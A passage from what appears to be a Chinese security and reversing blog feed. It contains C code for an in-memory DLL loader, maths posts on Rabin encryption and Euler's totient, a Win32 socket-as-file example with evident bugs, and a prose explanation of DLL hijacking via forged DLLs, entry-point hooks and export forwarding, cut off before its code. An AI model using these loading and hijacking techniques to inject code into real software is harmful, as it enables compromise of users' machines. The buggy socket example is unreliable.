class="line"><span class="keyword">for</span> (; pImportDescriptor-&gt;Characteristics; pImportDescriptor++)&#123;</span><br><span class="line"><span class="comment">//Load Library;</span></span><br><span class="line"><span class="type">char</span>*szModuleName = (<span class="type">char</span>*)ImageBase + pImportDescriptor-&gt;Name;</span><br><span class="line">HMODULE hModule = GetModuleHandleA(szModuleName);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line">hModule = LoadLibraryA((<span class="type">char</span>*)ImageBase + pImportDescriptor-&gt;Name);</span><br><span class="line"><span class="keyword">if</span> (hModule == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//INT 用于dll 绑定 ,修复IAT即可.</span></span><br><span class="line">PIMAGE_THUNK_DATA pThunkData = (PIMAGE_THUNK_DATA)(ImageBase + pImportDescriptor-&gt;FirstThunk);</span><br><span class="line"><span class="keyword">for</span> (; pThunkData-&gt;u1.ForwarderString; pThunkData++)&#123;</span><br><span class="line">DWORD dwFuncAddress = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//最高位区分序号导入还是名字导入</span></span><br><span class="line"><span class="keyword">if</span> (pThunkData-&gt;u1.Ordinal &amp; <span class="number">0x80000000</span>)&#123;</span><br><span class="line"><span class="comment">//序号导入.</span></span><br><span class="line">dwFuncAddress = (DWORD)MyGetProcAddress(hModule, (<span class="type">char</span>*)(pThunkData-&gt;u1.Ordinal &amp; <span class="number">0xffff</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//Import By Name</span></span><br><span class="line">IMAGE_IMPORT_BY_NAME*pName = (IMAGE_IMPORT_BY_NAME*)(pThunkData-&gt;u1.ForwarderString + ImageBase);</span><br><span class="line"><span class="comment">//pName-&gt;Hint;//??? Hint </span></span><br><span class="line">dwFuncAddress = (DWORD)MyGetProcAddress(hModule, (<span class="type">char</span>*)pName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwFuncAddress == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-5</span>;</span><br><span class="line">&#125;</span><br><span class="line">pThunkData-&gt;u1.Function = dwFuncAddress;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重定位修复</span></span><br><span class="line"></span><br><span class="line">pBaseRelocation = (IMAGE_BASE_RELOCATION*)(ImageBase +</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">5</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">dwDelta = (DWORD)ImageBase - dwOriginalBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pBaseRelocation-&gt;VirtualAddress || pBaseRelocation-&gt;SizeOfBlock)&#123;</span><br><span class="line">DWORD dwItems = (pBaseRelocation-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line">WORD * pAddrs = (WORD*)(<span class="number">8</span> + (DWORD)pBaseRelocation);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwItems; i++)&#123;</span><br><span class="line">WORD dwType = (pAddrs[i] &gt;&gt; <span class="number">12</span>);</span><br><span class="line">WORD dwOff = (pAddrs[i] &amp; <span class="number">0xfff</span>);</span><br><span class="line">DWORD*pRelocationAddr = (DWORD*)(ImageBase + pBaseRelocation-&gt;VirtualAddress + dwOff);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IMAGE_REL_BASED_ABSOLUTE:<span class="comment">//block alignment，只是用于对齐</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IMAGE_REL_BASED_HIGHLOW:</span><br><span class="line">*pRelocationAddr += dwDelta;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">-6</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Next Block</span></span><br><span class="line">pBaseRelocation = (IMAGE_BASE_RELOCATION*)(pBaseRelocation-&gt;SizeOfBlock + (DWORD)pBaseRelocation);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//tls......</span></span><br><span class="line"><span class="comment">//tls 不知到如何去处理???.....</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//set section property</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)&#123;</span><br><span class="line">DWORD dwProtect = <span class="number">0</span>;</span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">DWORD dwCharacter = pSectionHeader[i].Characteristics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwCharacter &amp; IMAGE_SCN_MEM_EXECUTE)&#123;</span><br><span class="line"><span class="keyword">if</span> (dwCharacter &amp; IMAGE_SCN_MEM_WRITE)&#123;</span><br><span class="line">dwProtect = PAGE_EXECUTE_READWRITE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dwProtect = PAGE_EXECUTE_READ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (dwCharacter &amp; IMAGE_SCN_MEM_READ)&#123;</span><br><span class="line"><span class="keyword">if</span> (dwCharacter&amp;IMAGE_SCN_MEM_WRITE)&#123;</span><br><span class="line">dwProtect = PAGE_READWRITE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dwProtect = PAGE_READONLY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//get section size</span></span><br><span class="line">DWORD dwSectionSize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ((i + <span class="number">1</span>) == pNtHeaders-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">dwSectionSize = pNtHeaders-&gt;OptionalHeader.SizeOfImage - pSectionHeader[i].VirtualAddress;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dwSectionSize = pSectionHeader[i + <span class="number">1</span>].VirtualAddress - pSectionHeader[i].VirtualAddress;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (!VirtualProtect(ImageBase + pSectionHeader[i].VirtualAddress,</span><br><span class="line">dwSectionSize, dwProtect, &amp;dwOldProtect))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-7</span>;</span><br><span class="line">&#125;</span><br><span class="line">pSectionHeader[i].Misc.PhysicalAddress = (DWORD)(ImageBase + pSectionHeader[i].VirtualAddress);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Run.</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI *DllEntryProc)</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span>;</span><br><span class="line">DllEntryProc entry = (DllEntryProc)(pNtHeaders-&gt;OptionalHeader.ImageBase +</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line"><span class="comment">//call dll main,init cruntime</span></span><br><span class="line"><span class="keyword">if</span> (entry)&#123;</span><br><span class="line">entry((HINSTANCE)ImageBase, DLL_PROCESS_ATTACH, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Find Entry</span></span><br><span class="line">*lppImageBase = ImageBase;</span><br><span class="line">*lppEntry = MyGetProcAddress((HINSTANCE)ImageBase, <span class="string">&quot;ModuleEntry&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows-PE格式&quot;&gt;&lt;a href=&quot;#Windows-PE格式&quot; class=&quot;headerlink&quot; title=&quot;Windows PE格式&quot;&gt;&lt;/a&gt;Windows PE格式&lt;/h1&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;tabl</summary>
      
    
    
    
    <category term="逆向" scheme="https://h4ckf0rfun.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Rabin加密</title>
    <link href="https://h4ckf0rfun.github.io/2023/02/05/Rabin%E5%8A%A0%E5%AF%86/"/>
    <id>https://h4ckf0rfun.github.io/2023/02/05/Rabin%E5%8A%A0%E5%AF%86/</id>
    <published>2023-02-05T09:38:30.000Z</published>
    <updated>2023-02-14T14:40:53.377Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h1><h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程:"></a>加密过程:</h2><ol><li>选取两个素数p ,q 满足 p = q = 3 (mod 4)，具体原因之后说明。</li><li>n = p * q</li><li>$C = M ^ 2 (mod  n)$</li></ol><h2 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程:"></a>解密过程:</h2><p>$M^2 = C (mod n)$</p><p>根据中国剩余定理:</p><p>$M^2 = C(mod p)$</p><p>$M^2 = C(mod q)$</p><p>这个方程组的唯一解就是 $M^2$</p><p>由于C一定是二次剩余，所以 $C^{\frac{(p-1)}{2}}=1$ (根据欧拉准则判断)</p><p>有:</p><p>$M^2 = C ^ \frac{(p-1)}{2} \times C (mod p)$ </p><p>$M^2 = C ^ \frac{(q-1)}{2} \times C (mod q)$</p><p>也就是：</p><p>$M^2 = C ^ \frac{(p+1)}{2}  (mod p)$ </p><p>$M^2 = C ^ \frac{(q+1)}{2}  (mod q)$</p><p>两边同时开方:</p><p>$M = \pm C ^ \frac{(p+1)}{4}  (mod p)$ </p><p>$M =  \pm C ^ \frac{(q+1)}{4}  (mod q)$</p><p>注意看这里的 $\frac{(p+1)}{4}$ </p><p>如果p = q = 3 (mod 4),这个算出来的就是整数.</p><p>接着两两组合能求出四个解.</p><p>涉及的知识：</p><ol><li>中国剩余定理</li><li>mod p下的二次剩余</li><li>欧拉准则 (a ^ ( p - 1 )/2 == 1 ,则是二次剩余.因为b ^2 = a ⇒ b^(p-1) = a ^ ( p - 1 )/2 =1)</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Rabin&quot;&gt;&lt;a href=&quot;#Rabin&quot; class=&quot;headerlink&quot; title=&quot;Rabin&quot;&gt;&lt;/a&gt;Rabin&lt;/h1&gt;&lt;h2 id=&quot;加密过程&quot;&gt;&lt;a href=&quot;#加密过程&quot; class=&quot;headerlink&quot; title=&quot;加密过程:</summary>
      
    
    
    
    <category term="数学" scheme="https://h4ckf0rfun.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>欧拉函数</title>
    <link href="https://h4ckf0rfun.github.io/2023/02/05/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/"/>
    <id>https://h4ckf0rfun.github.io/2023/02/05/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0/</id>
    <published>2023-02-05T09:37:43.000Z</published>
    <updated>2023-02-14T14:41:03.799Z</updated>
    
    <content type="html"><![CDATA[<h1 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h1><p>$\varphi (n) 是指小于n 的正整数中与n 互质的数的个数$</p><h2 id="如何计算"><a href="#如何计算" class="headerlink" title="如何计算?"></a>如何计算?</h2><h3 id="1-n-为-质数"><a href="#1-n-为-质数" class="headerlink" title="1. n 为 质数"></a>1. n 为 质数</h3><p>若n为质数的话,那么小于n的正整数都是与互质的 ，有1,2,3,4……n-1，一共有n-1 个数</p><p>所以$\varphi (n) = n - 1$</p><h3 id="2-n-p-k-其中p-是质数"><a href="#2-n-p-k-其中p-是质数" class="headerlink" title="2. $n = p ^ k$ 其中p 是质数"></a>2. $n = p ^ k$ 其中p 是质数</h3><p>若p 为质数的话，那么在所有正整数中，与n 不互质(即是p的倍数)的有 :</p><p>$1 \times p ,2 \times p,3 \times p,….p^{k-2} * p,….p^{k-1}\times p - p$.</p><p>也就是: </p><p>$1 \times p ,2 \times p,3 \times p,….p^{k-2} * p,….(p^{k-1} - 1)\times p$.</p><p>一共有 $(p^{k-1} - 1)$个</p><p>小于n的正整数一共有 $1,2,3…..p^k-1 个数$</p><p>那么与 n 互质的数就有 $(p ^ k -1)- (p ^ {k-1} - 1)= p^{k-1} \times (p-1)$ ，由1 可得:</p><p>$p^{k-1} \times (p-1) = p^{k-1} \times \varphi(p)$</p><h3 id="3-n-m-1-times-m-2-…-其中-m-1-m-2…-两两互素"><a href="#3-n-m-1-times-m-2-…-其中-m-1-m-2…-两两互素" class="headerlink" title="3. $n = m_1 \times m_2 …..$ ,其中 $m_1,m_2….$两两互素"></a>3. $n = m_1 \times m_2 …..$ ,其中 $m_1,m_2….$两两互素</h3><p>由中国剩余定理一个小于n 的数 a，是方程组:</p><script type="math/tex; mode=display">\begin{cases}  & x = a_1 (mod & m_1) \\  & x = a_2 (mod & m_2) \\  & ....\end{cases}</script><p>的唯一解，其中$m_1,m_2…$ 两两互素</p><p>假设小于 n 且与n 互质的一个数 为$x$  ，那么它一定也是与 $m_1,m_2…$ 互质的</p><p>证明: 假设不互质，有公因数t ，$t \times k_1 = m_1,t \times k_2 = x$ , 而 $n = m_1 <em> k3 = t </em> k_4$，这样的话$n$就与$x$不互质了。</p><p>现在知道 $x$ 与 $m_1,m_2…$ 互质，那么也能证明 $a_1 , a_2…$也分别与 $m_1 ,m_2$ 互质</p><p>一个n 对应一个方程组，那么我们只要计算一下有几个这样的方程组，就知道有几个a 了</p><p> $a_1 , a_2…$分别与 $m_1 ,m_2$ 互质，那么$a_1 ,a_2…$分别有 $\varphi(m_1),\varphi(m_2)…$种选择</p><p>那么就能构成 : $\varphi(m_1) \times \varphi(m_2) ….$ 个方程组，对应$\varphi(m_1) \times \varphi(m_2) ….$ 个 a</p><h3 id="4-n-p-1-k-1-times-p-2-k-2-…-其中-p-1-p-2-为质数"><a href="#4-n-p-1-k-1-times-p-2-k-2-…-其中-p-1-p-2-为质数" class="headerlink" title="4. $n = p_1 ^ {k_1} \times p_2 ^ {k_2} …$   其中$p_1,p_2$为质数"></a>4. $n = p_1 ^ {k_1} \times p_2 ^ {k_2} …$   其中$p_1,p_2$为质数</h3><p>这个可以根据前三种情况就能计算出来。($p_1,p_2$为质数，$p_1 ^ {k_1} 与 p_2 ^ {k_2} …$ 两两互质)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;欧拉函数&quot;&gt;&lt;a href=&quot;#欧拉函数&quot; class=&quot;headerlink&quot; title=&quot;欧拉函数&quot;&gt;&lt;/a&gt;欧拉函数&lt;/h1&gt;&lt;p&gt;$\varphi (n) 是指小于n 的正整数中与n 互质的数的个数$&lt;/p&gt;
&lt;h2 id=&quot;如何计算&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="数学" scheme="https://h4ckf0rfun.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>如何使用ReadFile和WriteFile对socket进行操作</title>
    <link href="https://h4ckf0rfun.github.io/2023/01/20/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReadFile%E5%92%8CWriteFile%E5%AF%B9socket%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C/"/>
    <id>https://h4ckf0rfun.github.io/2023/01/20/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReadFile%E5%92%8CWriteFile%E5%AF%B9socket%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C/</id>
    <published>2023-01-19T16:00:07.000Z</published>
    <updated>2023-01-28T10:19:30.454Z</updated>
    
    <content type="html"><![CDATA[<h1 id="如何使用ReadFile和WriteFile对socket进行操作"><a href="#如何使用ReadFile和WriteFile对socket进行操作" class="headerlink" title="如何使用ReadFile和WriteFile对socket进行操作?"></a>如何使用ReadFile和WriteFile对socket进行操作?</h1><p>在linux下面，一切皆文件，所以wrtie和read是可以对socket 进行读写的.</p><p>在windows下面实际上也是可以的.看看文档里面对ReadFile第一个参数的描述:</p><p><img src="https://h4ckf0rfun.github.io/2023/01/20/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReadFile%E5%92%8CWriteFile%E5%AF%B9socket%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C/Untitled.png" alt="Untitled"></p><p>里面说hFile可以是一个socket.</p><p>但是需要注意OVERLAPPED 这个东西</p><p>socket函数创建的socket默认是支持overlapped的，这样的话在调用ReadFile的时候，最后一个参数是不能忽略的.</p><p><img src="https://h4ckf0rfun.github.io/2023/01/20/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReadFile%E5%92%8CWriteFile%E5%AF%B9socket%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C/Untitled%201.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2023/01/20/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReadFile%E5%92%8CWriteFile%E5%AF%B9socket%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C/Untitled%202.png" alt="Untitled"></p><p>如果忽略的话会出现错误.</p><p>解决这个问题的办法有两个:</p><ol><li>在ReadFile后面加上Overlapped操作，这样每次读写的时候都是异步的。</li><li>直接调用WSASocket取消OVERLAPPED属性 (socket内部是调用的WSASocket)，这样ReadFile和WriteFile最后一个参数是可以直接忽略的</li></ol><p>如何把一个socket绑定到一个FILE结构体上?</p><p>在linux下面可以直接调用fdopen来创建一个FILE结构体，在windows下面虽然也有fdopen，但是还是有点区别.</p><p>需要先把 socket绑定到一个fd，然后再把这个fd 绑定到FILE结构体</p><p>但是最后试了下不行……，看来仅仅是支持ReadFile和WriteFile这两个操作,seek之类的操作就会导致失败</p><h3 id="2023-01-28-补充"><a href="#2023-01-28-补充" class="headerlink" title="2023.01.28 补充"></a>2023.01.28 补充</h3><p>突然想到从控制台读取和写数据也是不能seek操作的，但是他却能正常工作。猜测fdopen的时候mode只能写r或者w。这样的话只要给读绑定一个FILE结构体，再给写绑定一个FILE结构体应该就好了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;MSWSock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32&quot;</span>)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">WSADATA wsadata;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">0</span>), &amp;wsadata);</span><br><span class="line">SOCKET s = WSASocket(AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">SOCKADDR_IN addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">addr.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;49.235.129.40&quot;</span>);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(<span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> iRet = connect(s, (SOCKADDR*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ReadFd = _open_osfhandle(s,_O_RDONLY|_O_BINARY);</span><br><span class="line"><span class="type">int</span> WriteFd = _open_osfhandle(s, _O_WRONLY | _O_BINARY);</span><br><span class="line"></span><br><span class="line">FILE*fpRead = fdopen(ReadFd, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">FILE*fpWrite = fdopen(ReadFd, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(fpWrite, <span class="string">&quot;GET /update/ HTTP/1.1\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(fpWrite, <span class="string">&quot;Host: 49.235.129.40\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(fpWrite, <span class="string">&quot;Connection: close\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(fpWrite, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">fflush(fpWrite);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">fgets(buff, <span class="number">0x100</span>, fpRead);</span><br><span class="line"><span class="built_in">printf</span>(buff);</span><br><span class="line"><span class="keyword">if</span> (buff[<span class="number">0</span>] = <span class="string">&#x27;\r&#x27;</span> &amp;&amp; buff[<span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下：</p><p><img src="https://h4ckf0rfun.github.io/2023/01/20/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ReadFile%E5%92%8CWriteFile%E5%AF%B9socket%E8%BF%9B%E8%A1%8C%E6%93%8D%E4%BD%9C/Untitled%203.png" alt="Untitled"></p><p>正常运行！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;如何使用ReadFile和WriteFile对socket进行操作&quot;&gt;&lt;a href=&quot;#如何使用ReadFile和WriteFile对socket进行操作&quot; class=&quot;headerlink&quot; title=&quot;如何使用ReadFile和WriteFile对soc</summary>
      
    
    
    
    <category term="Win32" scheme="https://h4ckf0rfun.github.io/categories/Win32/"/>
    
    
  </entry>
  
  <entry>
    <title>DLL劫持</title>
    <link href="https://h4ckf0rfun.github.io/2023/01/05/DLL%E5%8A%AB%E6%8C%81/"/>
    <id>https://h4ckf0rfun.github.io/2023/01/05/DLL%E5%8A%AB%E6%8C%81/</id>
    <published>2023-01-05T06:56:47.000Z</published>
    <updated>2023-01-05T07:03:16.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dll-劫持"><a href="#Dll-劫持" class="headerlink" title="Dll 劫持"></a>Dll 劫持</h1><ol><li><p>最普通的就是找到依赖的第三方的Dll ，伪造好Dll,导出相同的函数，只不过现在导出的函数内是我们自己写的代码。之后当进程调用Dll 导出的函数时，就会执行我们的代码了。</p></li><li><p>上面第一种当中，在主程序中可能由于某些条件不成立并不会调用到Dll 的导出函数，这时候我们的代码就不会执行。解决的办法是：</p><p> (1) 在DllMain中 写一段inline hook 到OEP，这样程序开始执行的时候就会跳到我们得代码那里去</p><p> (2) 在Dll中创建一个全局对象，在构造函数内写一段inline hook 到 OEP处。</p><p> 上面两种实质上都是一样的，只不过写inline hook的时机不一样</p></li><li><p>如果找不到依赖的第三方Dll ，也就是说，程序依赖的Dll 都是系统的Dll，这时候我们就得需要Dll 导出函数转发了, (注意最好不要自己去实现一个空的导出函数，这样可能会导致我们自己的代码也无法正常运行，必须不能破坏系统提供的功能)</p></li></ol><p>这里我们举个例子：</p><p><img src="https://h4ckf0rfun.github.io/2023/01/05/DLL%E5%8A%AB%E6%8C%81/Untitled.png" alt="Untitled"></p><p>这个程序依赖的DLL都是系统的Dll，我们找一个导出函数少的来伪造，这里选DNSAPI.Dll</p><p>转发函数:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 